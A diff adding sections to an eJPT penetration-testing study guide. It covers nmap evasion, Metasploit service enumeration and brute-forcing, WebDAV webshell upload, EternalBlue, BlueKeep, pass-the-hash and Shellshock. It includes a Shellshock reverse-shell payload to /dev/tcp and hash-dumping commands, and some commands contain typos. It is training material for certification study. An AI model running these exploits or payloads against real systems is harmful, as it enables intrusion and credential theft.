@@ -6,10 +6,6 @@ Author: Samuel Pérez López
 
 These notes are intended to serve as a comprehensive guide for the eJPT (Junior Penetration Tester) certification. They cover various aspects of the certification, including assessment methodologies, host and network auditing, host and network penetration testing, and web application penetration testing.
 
-The notes are divided into sections, each corresponding to a specific area of the certification. Each section contains a list of courses, along with their duration and the instructor's name.
-
-The aim is to provide a structured and easy-to-follow study guide for anyone preparing for the eJPT certification.
-
 # Table of Contents
 
 1. **Assessment Methodologies**
@@ -49,7 +45,34 @@ The aim is to provide a structured and easy-to-follow study guide for anyone pre
          - [Optimizing Nmap Scans](#optimizing-nmap-scans)
          - [Nmap Output Formats](#nmap-output-formats)
    - [Enumeration](#enumeration)
-   - [Vulnerability Assessment](#vulnerability-assessment)
+      - [Introduction to Enumeration](#introduction-to-enumeration)
+      - [Nmap Scripting Engine (NSE)](#nmap-scripting-engine-nse)
+         - [Port Scanning & Enumeration with Nmap](#port-scanning-enumeration-with-nmap)
+         - [Importing Nmap Scan Results into MSF](#importing-nmap-scan-results-into-msf)
+         - [Port Scanning with Auxiliary Modules](#port-scanning-with-auxiliary-modules)
+      - [Service Enumeration](#service-enumeration)
+         - [FTP Enumeration](#ftp-enumeration)
+         - [SMB Enumeration](#smb-enumeration)
+         - [Web Server Enumeration](#web-server-enumeration)
+         - [MySQL Enumeration](#mysql-enumeration)
+         - [SSH Enumeration](#ssh-enumeration)
+         - [SMTP Enumeration](#smtp-enumeration)
+   - [Assessment Methodologies Vulnerability Assessment](#assessment-methodologies-vulnerability-assessment)
+      - [Vulnerability Assessment](#vulnerability-assessment)
+         - [Overview of Windows Vulnerabilities](#overview-of-windows-vulnerabilities)
+         - [Frequently Exploited Windows Services](#frequently-exploited-windows-services)
+         - [Vulnerability Scanning with MSF](#vulnerability-scanning-with-msf)
+         - [WebDAV Vulnerabilities](#webdav-vulnerabilities)
+      - [Vulnerability Analysis](#vulnerability-analysis)
+         - [Vulnerability Analysis: EternalBlue](#vulnerability-analysis-eternalblue)
+         - [Vulnerability Analysis: BlueKeep](#vulnerability-analysis-bluekeep)
+         - [Pass-the-Hash Attacks](#pass-the-hash-attacks)
+         - [Frequently Exploited Linux Services](#frequently-exploited-linux-services)
+         - [Vulnerability Analysis: Shellshock](#vulnerability-analysis-shellshock)
+      - [Vulnerability Scanning](#vulnerability-scanning)
+         - [Vulnerability Scanning with Nessus](#vulnerability-scanning-with-nessus)
+         - [Web App Vulnerability Scanning with WMAP](#web-app-vulnerability-scanning-with-wmap)
+         
 
 2. **Host & Networking Auditing**
    - [Auditing Fundamentals](#auditing-fundamentals)
@@ -572,19 +595,754 @@ sudo nmap -p- -sS --open -vvv --min-rate 5000 -n -Pn -iL ip.txt -oG allPorts.txt
 
 #### **Service Version & OS Detection**
 
+```bash
+nmap -T4 -sS -sV --version.intensity 8 -O --osscan-guess -p- ip
+```
+
 #### **Nmap Scripting Engine (NSE)**
 
-### **Evasion, Scan Performance & Output**
+```bash
+nmap -sS -sV -sC -p- --min-rate=5000 ip
+```
+
+```bash
+nmap -sS -A -T4 --script=category ip
+```
+
+- `-A-` = traceroute + -sC + -sV + -O
+
+### Evasion, Scan Performance & Output
+
+In penetration testing and network scanning, evading detection, optimizing scan performance, and effectively managing output are crucial aspects. Evasion techniques help in bypassing firewalls, intrusion detection systems (IDS), and other security measures to avoid detection. Optimizing scan performance ensures that scans are completed efficiently and within a reasonable timeframe. Properly managing scan output is essential for analyzing results and documenting findings. In this section, we will explore various strategies and tools to enhance evasion, improve scan performance, and handle scan output effectively.
 
 #### **Firewall Detection & IDS Evasion**
 
+To detect if a Windows machine has a firewall you can run:
+
+```bash
+nmap -Pn -sA -p445,3389 ip
+```
+
+If the ports are `unfiltered`there is no firewall.
+
+Normally to fragment the packets you can do:
+
+```bash
+nmap -Pn -sS -sV -p- -f ip
+```
+
+```bash
+nmap -Pn -sS -sV -p- -f --data-length 200 -mtu 34 -g 53 -D gateway_ip ip
+```
+- `--data-length`: Adds 200 bytes of random data to the packets. This can help evade detection by making the packets look less like typical nmap scans.
+- `-mtu`: Sets the maximum transmission unit (MTU) to 34 bytes. This further fragments the packets, making it harder for security systems to detect the scan.
+- `-g`: Sets the source port of the packets to 53. This can help evade detection as some firewalls and IDS may treat traffic from port 53 (commonly used for DNS) as less suspicious.
+- `-D`: Uses decoy addresses to hide the real source of the scan. gateway_ip is a placeholder for the IP address of the decoy. This makes it harder for the target to identify the actual source of the scan.
+
 #### **Optimizing Nmap Scans**
+
+```bash
+nmap -sS -sV -F --host-timeout 5s ip/mask
+```
+
+- `--host-timeout`: Sets a timeout of 5 seconds for the scan. If the scan takes longer than this, nmap will stop scanning the host.
+
+```bash
+nmap -sS -sV -F --scan-delay 5s ip
+```
+- `--scan-delay`: Introduces a delay of 5 seconds between each probe sent to the target. This can help evade detection by IDS/IPS systems that might flag rapid scanning activity.
 
 #### **Nmap Output Formats**
 
+- `-oN`: Normal output. This is the default human-readable format that `nmap` uses to display scan results.
+- `-oX`: XML output. This format is useful for parsing the scan results with other tools or scripts that can process XML data.
+- `-oS`: Script kiddie output. This format is designed to look like the output from a popular hacking tool, making it less professional but more fun.
+- `-oG`: Grepable output. This format is useful for quickly parsing the scan results with command-line tools like `grep` or `awk`.
+
+SMB Nmap:
+```bash
+nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-shares demo.ine.local
+nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
+```
+
+
 ## **Enumeration**
 
-## **Vulnerability Assessment**
+Enumeration is the process of identifying and analyzing `network services`, a fundamental step in the `penetration testing` lifecycle. You will gain in-depth knowledge of using the `Nmap Scripting Engine (NSE)` for advanced service detection and enumeration, which provides an automated and customizable approach to network scanning. The material covers the enumeration techniques for commonly encountered services such as `SSH`, `FTP`, `SMB`, and `SMTP`. Through practical lab demonstrations, you will master the skills to uncover `service versions`, identify potential `vulnerabilities`, and gather critical information that can be leveraged in subsequent penetration testing phases. The content will equip you with the expertise to enumerate network services and elevate your penetration testing capabilities efficiently.
+
+### **Introduction to Enumeration**
+
+After the `host discovery` and `port scanning` phase of a penetration test, the next step is `service enumeration`. The goal of service enumeration is to gather detailed information about the `hosts` and `services` on a network, such as `account names`, `shares`, and `misconfigured services`. Like scanning, enumeration involves active connections to remote devices.
+
+There are many `network protocols` that can be targeted if misconfigured or left enabled. This section explores various `tools` and `techniques` to interact with these protocols, with the potential for exploitation in later phases.
+
+#### **Nmap Scripting Engine (NSE)**
+
+The Nmap Scripting Engine (NSE) is a powerful feature of Nmap that extends its capabilities beyond simple port scanning. NSE allows users to write and use scripts to automate a wide range of networking tasks, including advanced service detection, vulnerability detection, and even exploitation. These scripts can be used to gather detailed information about network services, identify potential security issues, and perform complex network reconnaissance. In this section, we will explore how to leverage NSE for effective service enumeration and penetration testing, providing you with the skills to enhance your network scanning and security assessment processes.
+
+##### **Port Scanning & Enumeration with Nmap**
+
+```bash
+nmap -Pn -sV -O ip -oX windows_server_2012
+```
+
+##### **Importing Nmap Scan Results into MSF**
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace 
+workspace -a Win2k12
+db_import /root/windows_server_2012
+hosts
+services
+workspace -a Nmap_MSF
+db_nmap -Pn -sV -O ip
+vulns
+```
+
+##### **Port Scanning with Auxiliary Modules**
+
+Auxiliary modules are versatile tools used for scanning, discovery, and fuzzing. They can perform both TCP and UDP port scanning and enumerate information from services like FTP, SSH, and HTTP. These modules are useful during both the information gathering and post-exploitation phases of a penetration test. After gaining initial access to a target system, auxiliary modules can discover hosts and perform port scanning on different network subnets. In the lab infrastructure, the objective is to utilize auxiliary modules to discover open ports on the first target, exploit the service running on the target to gain a foothold, use the foothold to access other systems on a different network subnet (pivoting), and then use auxiliary modules to scan for open ports on the second target.
+
+For searching TCP auxiliary modelues you can do:
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a Port_Scan
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS ip
+run (port 80 open)
+curl ip
+search xoda (technology of the web server)
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS ip
+set TARGETURI /
+set LHOST my_ip
+exploit
+```
+
+-Spawns meterpreter session
+
+```bash
+sysinfo
+shell
+/bin/bash -i
+ifconfig
+^C
+run autoroute -s ip
+background
+search portscan
+use 5
+set RHOSTS ip (other machine)
+run
+````
+
+For searching UDP auxiliary modelues you can do:
+
+```bash
+back
+search udp_sweep
+use 0
+setr RHOST ip
+run
+````
+
+For scanning the 2 machine:
+
+Check the static binaries available in the "/usr/bin/" directory
+
+```bash
+ls -al /usr/bin/nmap
+file /usr/bin/nmap
+```
+
+CTRL+z to background the Metasploit session
+Create bash script to scan the first 1000 ports
+
+```bash
+#!/bin/bash
+for port in {1..1000}; do
+ timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done
+````
+
+Press "fg" and press enter to foreground the Metasploit session.
+
+```bash
+sessions -i 1
+upload /usr/bin/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh demo2.ine.local
+nmap -p- demo2.ine.local
+```
+
+#### **Service Enumeration**
+
+Service enumeration is a critical phase in the penetration testing process, following host discovery and port scanning. This phase involves actively connecting to network services to gather detailed information about the services running on the target hosts. The goal is to identify service versions, account names, shares, and any misconfigured services that could be exploited. By understanding the specifics of the services in use, penetration testers can uncover potential vulnerabilities and security weaknesses. In this section, we will explore various tools and techniques for effective service enumeration, enabling you to gather the necessary information to advance your penetration testing efforts.
+
+
+##### **FTP Enumeration**
+
+FTP (File Transfer Protocol) uses TCP port `21` for file sharing between a server and clients, and is often used for transferring files to and from web server directories. Multiple auxiliary modules can be used to enumerate information and perform brute-force attacks on FTP servers. FTP authentication typically requires a username and password, but some improperly configured FTP servers allow anonymous login.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a FTP_enum
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS ip
+run 
+search ftp 
+search type:auxiliary name:ftp
+use 24 (auxiliary/scanner/ftp/ftp_version)
+set RHOSTS ip
+run
+```
+```bash
+search ProFTPD (technology of ftp)
+back
+search type:auxiliary name:ftp
+use 23 (auxiliary/scanner/ftp/ftp_login)
+set RHOSTS ip
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+ftp ip
+```
+
+```bash
+search type:auxiliary name:ftp
+use 19 (auxiliary/scanner/ftp/anonymous)
+set RHOSTS ip
+run
+```
+
+##### **SMB Enumeration**
+
+SMB (Server Message Block) is a network file sharing protocol used for sharing files and peripherals on a local network (LAN). It uses TCP port `445`, but originally ran on port `139` over NetBIOS. SAMBA is the Linux implementation of SMB, enabling Windows systems to access Linux shares and devices. Auxiliary modules can be used to enumerate SMB versions, shares, users, and perform brute-force attacks to identify users and passwords.
+
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a SMB_enum
+setg RHOSTS ip (global variable auto assign)
+search type:auxiliary name:smb
+use 34 (auxiliary/scanner/smb/smb_version)
+run
+use 29 (auxiliary/scanner/smb/smb_enumusers)
+run (users: john, elie, aisha, shawn, emma, admin)
+use 28 (auxiliary/scanner/smb/smb_enumshares)
+set ShowFiles true
+run
+search smb_login
+use 1
+set SMBUser admin
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run (admin:password)
+exit
+```
+
+```bash
+smbclient -L ////ip// -U admin
+smbclient ////ip//public -U admin
+ls
+smbclient ////ip//aisha -U admin
+cd dir
+```
+
+NetBIOS computer name of samba
+
+```bash
+nmblookup -A ip
+```
+
+See shares if there is anonymous connection allowed
+```bash
+smbclient -L ip -N
+```
+
+```bash
+rpcclient -U "" -N ip
+```
+
+##### **Web Server Enumeration**
+
+A web server is software that serves website data using HTTP (Hypertext Transfer Protocol) over TCP port `80` or `443` for HTTPS. Auxiliary modules can be used to enumerate the web server version, HTTP headers, brute-force directories, and more. Popular web servers include Apache, Nginx, and Microsoft IIS.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a Web_enum
+setg RHOSTS ip 
+setg RHOST ip 
+search type:auxiliary name:http
+use 42 (auxiliary/scanner/http/http_version)
+run
+search http_header
+use 1
+run
+search robots_txt
+use 1
+run (directories disallowed: /data and /secure)
+curl http://ip/data/
+curl http://ip/secure/
+use auxiliary/scanner/http/brute_dirs
+run
+search dir_scanner
+use 1
+run
+use auxiliary/scanner/http/dir_listing
+run
+search files_dir
+use 1
+run
+search http_login
+use 4
+set AUTH_URI /secure/
+unset USERPASS_FILE
+set USER_FILE /usr/share/metasploit-framework/datawordlist/namelist.txt
+set PASS_FILE /usr/share/metasploit-framework/datawordlist/unix_passwords.txt
+set VERBOSE false
+run
+search apache_userdir_enum
+use 1
+set USER_FILE /usr/share/metasploit-framework/datawordlist/common_users.txt
+run (user: rooty)
+search http_login
+use 4
+echo "rooty" > user.txt
+set USER_FILE /root/user.txt
+run
+use auxiliary/scanner/http/http_put
+set PATH /data
+set FILENAME test.txt
+set FILEDATA "Welcome To AttackDefense"
+run
+wget http://victim-1:80/data/test.txt 
+cat test.txt
+use auxiliary/scanner/http/http_put
+set PATH /data
+set FILENAME test.txt
+set ACTION DELETE
+run
+```
+
+##### **MySQL Enumeration**
+
+MySQL is an open-source relational database management system based on SQL, commonly used to store web application data and customer records. It typically uses TCP port `3306` but can run on any open TCP port. Auxiliary modules can enumerate the MySQL version, perform brute-force attacks to identify passwords, execute SQL queries, and more.
+
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a MySQL_enum
+setg RHOSTS ip 
+setg RHOST ip 
+search type:auxiliary name:mysql
+use 6 (auxiliary/scanner/portscan/tcp)
+run
+use 9 (auxiliary/scanner/mysql/mysql_version)
+run
+search mysql_login
+use 1
+show options
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false 
+run
+search mysql_enum
+use 1
+info
+set PASSWORD password
+set USERNAME root
+run
+search mysql_sql
+use 1
+show options
+set PASSWORD password
+set USERNAME root
+run
+set SQL show databases;
+run 
+set SQL use videos;
+run
+search mysql_schema
+use 1
+show options
+set PASSWORD password
+set USERNAME root
+run
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD password
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD password
+set RHOSTS demo.ine.local
+run
+hosts
+services
+loot
+creds
+exit
+mysql -h ip -u root -p
+```
+
+##### **SSH Enumeration**
+
+SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet. It is typically used for remote access to servers and systems, using TCP port `22` by default. Auxiliary modules can enumerate the SSH version and perform brute-force attacks to identify passwords, potentially providing remote access to a target.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a SSH_enum
+setg RHOSTS ip 
+setg RHOST ip 
+search type:auxiliary name:shh
+use 15 (auxiliary/scanner/ssh/ssh_version)
+show options
+run
+search openssh
+search type:auxiliary name:shh
+use 13 (auxiliary/scanner/ssh/ssh_login)
+show options
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+run
+sessions
+sessions 1
+/bin/bash -i
+find / -name "flag"
+cat /flag
+exit
+search type:auxiliary name:shh
+use 11 (auxiliary/scanner/ssh/ssh_enumusers)
+show options
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+
+##### **SMTP Enumeration**
+
+SMTP (Simple Mail Transfer Protocol) is used for email transmission, typically on TCP port `25`, but can also run on ports `465` and `587`. Auxiliary modules can enumerate the SMTP version and user accounts on the target system.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a SMTP_enum
+setg RHOSTS ip 
+setg RHOST ip 
+search type:auxiliary name:smtp
+use 7 (auxiliary/scanner/smtp/smtp_version)
+show options
+run
+search type:auxiliary name:smtp
+use 4 (auxiliary/scanner/smtp/smtp_enum)
+run
+exit
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
+```
+
+## **Assessment Methodologies Vulnerability Assessment**
+
+The Vulnerability Assessment course is designed for penetration testers and cybersecurity practitioners looking to enhance their ability to identify and evaluate security weaknesses in networks, applications, and systems. This course provides a comprehensive introduction to vulnerability assessment, distinguishing it from vulnerability scanning and penetration testing, while emphasizing its crucial role in the overall security lifecycle. Through hands-on labs using industry-standard tools like Nessus and Nmap, you will learn to conduct thorough assessments, interpret findings, and prioritize vulnerabilities for remediation, equipping you with the skills needed to safeguard digital assets effectively.
+
+### **Vulnerability Assessment**
+
+Microsoft Windows, with a market share of over `70%` as of `2021`, is the dominant operating system worldwide, making it a prime target for attackers. Over the past `15 years`, Windows has experienced several severe vulnerabilities, such as `MS08-067 (Conficker)` and `MS17-010 (EternalBlue)`. Due to its popularity, many of these vulnerabilities have publicly accessible exploit code, making them relatively easy to exploit.
+
+Microsoft Windows has various OS versions, leading to a fragmented threat surface. Vulnerabilities in `Windows 7` may not exist in `Windows 10`. Despite different versions, all Windows OS share similarities due to their development in `C`, making them susceptible to `buffer overflows` and `arbitrary code execution`. Windows is not securely configured by default and requires proactive security practices. Newly discovered vulnerabilities are not immediately patched, leaving many systems unpatched. Frequent new releases contribute to exploitation as companies often delay upgrading, opting to use older, vulnerable versions. Windows is also susceptible to cross-platform vulnerabilities like `SQL injection` and physical attacks such as `theft` and `malicious peripherals`.
+
+#### **Overview of Windows Vulnerabilities**
+
+Types of Windows Vulnerabilities:
+- `Information disclosure`: Allows access to confidential data.
+- `Buffer overflows`: Caused by programming errors, allowing data to overrun allocated buffers.
+- `Remote code execution`: Allows remote execution of code on the target system.
+- `Privilege escalation`: Allows attackers to elevate privileges after initial compromise.
+- `Denial of Service (DOS)`: Consumes system resources, preventing normal functionality.
+
+#### **Frequently Exploited Windows Services**
+
+Microsoft Windows has various native services and protocols that can be configured to run on a host. These services provide attackers with access vectors to gain entry to a target host. Understanding these services, their functionality, and potential vulnerabilities is crucial for penetration testers.
+
+| Protocol/Service | Ports          | Purpose                                                                                       |
+|------------------|----------------|-----------------------------------------------------------------------------------------------|
+| Microsoft IIS (Internet Information Services) | TCP ports 80/443 | Proprietary web server software developed by Microsoft that runs on Windows.                   |
+| WebDAV (Web Distributed Authoring & Versioning) | TCP ports 80/443 | HTTP extension that allows clients to update, delete, move, and copy files on a web server. WebDAV is used to enable a web server to act as a file server. |
+| SMB/CIFS (Server Message Block Protocol) | TCP port 445    | Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN). |
+| RDP (Remote Desktop Protocol) | TCP port 3389   | Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system. |
+| WinRM (Windows Remote Management Protocol) | TCP ports 5986/443 | Windows remote management protocol that can be used to facilitate remote access with Windows systems. |
+
+#### **Vulnerability Scanning with MSF**
+
+Vulnerability scanning and detection involve scanning a target for vulnerabilities and verifying their exploitability. This section focuses on using auxiliary and exploit modules to identify inherent vulnerabilities in services, operating systems, and web applications. This information is crucial for the exploitation phase. Additionally, we will explore using third-party vulnerability scanning tools like Nessus and integrating Nessus functionality into MSF.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a MS3
+setg RHOSTS ip 
+setg RHOST ip 
+db_nmap -sS -sV -O ip
+hosts
+services
+search type:exploit name:Microsoft IIS
+search type:exploit name:MySQL 5.5
+search type:exploit name:Sun GlassFish
+use 1
+info
+set payload windows/meterpreter/reverse_tcp
+show options
+search eternalblue
+use 3
+show options
+run
+use 0
+run
+sysinfo
+exit
+back
+searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
+---
+cd Downloads
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+sudo mv db_autopawn.rb /usr/share/metasploit-framework/plugins
+msfconsole
+load db_autopawn
+db_autopawn -p -t -PI port
+analyze
+vulns
+```
+
+#### **WebDAV Vulnerabilities**
+
+IIS (Internet Information Services) is a `proprietary web server software` developed by `Microsoft` for the `Windows NT family`. It hosts `websites` and `web apps`, providing a robust `GUI` for management. IIS supports both `static` and `dynamic web pages` developed in `ASP.NET` and `PHP`, typically running on ports `80/443`. Supported executable file extensions include `.asp`, `.aspx`, `.config`, and `.php`.
+
+WebDAV (Web-based Distributed Authoring and Versioning) is a set of `HTTP extensions` that allow users to collaboratively edit and manage files on remote web servers, enabling a web server to function as a `file server`. It runs on `Microsoft IIS` on ports `80/443` and requires legitimate credentials (`username` and `password`) for authentication.
+
+First, identify if WebDAV is configured on the IIS web server. Perform a `brute-force attack` to find legitimate credentials for authentication. Once authenticated, upload a malicious `.asp payload` to execute arbitrary commands or obtain a `reverse shell` on the target.
+
+- `davtest`: Used to scan, authenticate, and exploit a WebDAV server. Pre-installed on most penetration testing distributions like `Kali` and `Parrot OS`.
+- `cadaver`: Supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers. Pre-installed on most penetration testing distributions like `Kali` and `Parrot OS`.
+
+```bash
+nmap -sV -p 80 --script=http-enum ip
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ip http-get /webdav/
+davtest -url http://ip/webdav
+davtest -auth user:password -url http://ip/webdav
+cadaver http://ip/webdav
+ls
+put /usr/share/webshells/asp/webshell.asp
+dir C:\
+type C:\flag.txt
+---
+ls -al /usr/share/webshells/
+ls -al /usr/share/webshells/asp
+```
+
+### **Vulnerability Analysis**
+
+#### **Vulnerability Analysis: EternalBlue**
+
+EternalBlue (`MS17-010/CVE-2017-0144`) is a collection of Windows vulnerabilities and exploits that allow `remote code execution` and access to a Windows system and its network. Developed by the `NSA` and leaked by the `Shadow Brokers` in 2017, EternalBlue exploits a vulnerability in the Windows `SMBv1 protocol` by sending specially crafted packets to execute arbitrary commands.
+
+The EternalBlue exploit was used in the `WannaCry ransomware attack` on June 27, 2017, to spread ransomware across networks. This vulnerability affects multiple versions of Windows, including `Vista`, `7`, `Server 2008`, `8.1`, `Server 2012`, `10`, and `Server 2016`.
+
+Microsoft released a patch for the vulnerability in March 2017, but many systems remain unpatched. The EternalBlue exploit has an `MSF auxiliary module` to check for vulnerability and an `exploit module` to exploit it. This exploit can provide a privileged `meterpreter session` on vulnerable Windows systems.
+
+```bash
+sudo nmap -sV -p 445 -O i`p
+sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 ip
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+pip install -r requirements.txt
+cd shellcode
+chmod +x shell_prep.sh
+./shell_prep.sh
+ip
+1234
+1234
+1
+1
+chmod +x eternalblue_exploit7.py
+python eternalblue_exploit7.py ip shellcode/sc_x64.bin
+----
+nc -nvlp 1234
+```
+
+```bash
+service postgresql start
+msfconsole
+db_status
+workspace -a eternalblue
+setg RHOSTS ip 
+setg RHOST ip 
+search eternalblue
+use 0
+show options
+run
+```
+
+#### **Vulnerability Analysis: BlueKeep**
+
+BlueKeep (`CVE-2019-0708`) is an `RDP vulnerability` in Windows that allows attackers to remotely execute arbitrary code and gain access to a Windows system and its network. Made public by `Microsoft` in May 2019, the exploit targets a vulnerability in the Windows `RDP protocol`, enabling attackers to access a chunk of `kernel memory` and execute arbitrary code at the system level without authentication.
+
+Microsoft released a `patch` for the BlueKeep vulnerability (`CVE-2019-0708`) on May 14th, 2019, urging companies to patch it immediately. At the time of discovery, about `1 million systems` worldwide were found to be vulnerable. BlueKeep affects multiple versions of Windows, including `XP`, `Vista`, `Windows 7`, and `Windows Server 2008 & R2`.
+
+The BlueKeep vulnerability has various illegitimate `PoCs` and exploit code that could be malicious. It is recommended to use only verified exploit code and modules. BlueKeep has an `MSF auxiliary module` to check for vulnerability and an `exploit module` to exploit it on unpatched systems, providing a privileged `meterpreter session` on the target system. 
+
+```bash
+sudo nmap -p 3389 ip
+msfconsole 
+setg RHOSTS ip 
+setg RHOST ip 
+search BlueKeep
+use 0
+show options
+run
+search BlueKeep
+use 1
+run
+show targets
+set target 2
+run
+sysinfo
+pgrep lsass
+migrate 780
+```
+
+#### **Pass-the-Hash Attacks**
+
+Pass-the-hash is an exploitation technique that involves capturing NTLM hashes or clear-text passwords to authenticate with the target legitimately. Tools like Metasploit PsExec module and Crackmapexec can facilitate this attack. This technique allows access to the target system using legitimate credentials instead of service exploitation.
+
+```bash
+load kiwi
+lsa_dump_sam
+hashdump
+search psexec
+use 9
+set SMBUser Administrator
+set SMBPass hash
+run
+set target Command
+run
+set target Native\ upload
+```
+
+```bash
+crackmapexec smb ip -u Administrator -H "hash"
+crackmapexec smb ip -u Administrator -H "hash" -x "ipconfig"
+```
+
+#### **Frequently Exploited Linux Services**
+
+Linux is a `free` and `open-source` operating system that combines the `Linux kernel`, developed by `Linus Torvalds`, and the `GNU toolkit`, developed by `Richard Stallman`, commonly referred to as `GNU/Linux`. While Linux has various use cases, it is typically deployed as a `server operating system`. This means specific `services` and `protocols` are commonly found running on a Linux server, providing attackers with `access vectors` to target hosts. Understanding these services, their functionality, and potential `vulnerabilities` is crucial for `penetration testers`.
+
+| Protocol/Service    | Ports         | Purpose                                                                                       |
+|---------------------|---------------|-----------------------------------------------------------------------------------------------|
+| Apache Web Server   | TCP ports 80/443 | Free and open-source cross-platform web server released under the Apache License 2.0. Apache accounts for over 80% of web servers globally. |
+| SSH (Secure Shell)  | TCP port 22   | SSH is a cryptographic remote access protocol used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet. |
+| FTP (File Transfer Protocol) | TCP port 21   | FTP is a protocol that uses TCP port 21 for file sharing between a server and clients. |
+| SAMBA               | TCP port 445  | Samba is the Linux implementation of SMB, allowing Windows systems to access Linux shares and devices. |
+
+#### **Vulnerability Analysis: Shellshock**
+
+Shellshock (`CVE-2014-6271`) is a family of vulnerabilities in the `Bash shell` (since V1.3) that allow remote arbitrary command execution, enabling attackers to gain remote access via a `reverse shell`. Discovered by `Stéphane Chazelas` on September 12, 2014, and made public on September 24, 2014, Bash is the default shell for most `Linux distributions` and is part of the `GNU project`.
+
+The Shellshock vulnerability in Bash causes it to mistakenly execute trailing commands after specific characters: `() {:;};`. This affects `Linux systems`, as `Windows` does not use Bash. `Apache web servers` running `CGI` or `.sh scripts` are also vulnerable, as CGI scripts allow arbitrary command execution on the Linux system.
+
+To exploit Shellshock, locate an input vector or script that communicates with Bash. On an Apache web server, use accessible CGI scripts. When a CGI script is executed, the web server runs it with Bash. This vulnerability can be exploited manually or automatically using an `MSF exploit module`.
+
+```bash
+nmap -sV ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
+```
+
+burpsuite:
+User-Agent: () { :; }; echo; echo; /bin/bash -c `cat /etc/passwd'
+
+```bash
+nc -nvlp 1234
+```
+
+User-Agent: () { :; }; echo; echo; /bin/bash -c `bash -i>&/dev/tcp/my_ip/1234 0>&1'
+
+```bash
+service postgresql start
+msfconsole
+db_status
+setg RHOSTS ip 
+setg RHOST ip 
+search shellshock
+use 5
+show options
+set TARGETURI /gettime.cgi
+run
+```
+
+### **Vulnerability Scanning**
+
+#### **Vulnerability Scanning with Nessus**
+
+Nessus is a proprietary vulnerability scanner developed by Tenable. It automates the identification of vulnerabilities and provides relevant information like CVE codes. After scanning a target system, Nessus results can be imported into MSF for analysis and exploitation. The free version, Nessus Essentials, allows scanning of up to 16 IPs.
+
+#### **Web App Vulnerability Scanning with WMAP**
+
+WMAP is a powerful web application vulnerability scanner that automates web server enumeration and scans web applications for vulnerabilities. Available as an MSF plugin, WMAP can be loaded directly into MSF, allowing for integrated web app vulnerability scanning within the MSF framework.
+
+```bash
+service postgresql start
+msfconsole
+db_status
+setg RHOSTS ip 
+setg RHOST ip 
+load wmap
+wmap_
+wmap_sites -a ip
+wmap_targets -t http://ip
+wmap_sites -l
+wmap_targets -l
+wmap_run -t
+wmap_run -e
+wmap_vulns -l
+use auxiliary/scanner/http/http_put
+run
+set PATH /data/
+run
+curl http://ip:80/data/msf_http_put_test.txt
+show options
+set FILEDATA "this does work"
+set FILENAME "this_works.txt
+run
+curl http://ip:80/data/this_works.txt
+```
 
 # **Host & Networking Auditing**
 
